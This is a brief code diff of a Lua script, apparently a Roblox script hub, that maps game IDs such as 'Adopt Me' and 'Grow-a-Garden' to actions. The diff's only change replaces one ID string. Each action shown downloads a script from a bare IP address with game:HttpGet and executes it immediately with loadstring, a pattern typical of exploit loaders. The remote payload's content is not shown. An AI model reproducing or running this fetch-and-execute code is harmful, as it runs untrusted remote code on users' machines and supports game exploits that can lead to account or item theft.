@@ -244,7 +244,7 @@ local handlers = {
         loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
     end},
     [920587237] = {name="Adopt Me", action=function()
-        ID="6f2f3707-06ef-4d90-ac3f-054271f0966a"
+        ID="8b249fe3-a46b-468b-bb5b-71412dc5a12c"
         loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
     end},
     [126884695634066] = {name="Grow-a-Garden", action=function()
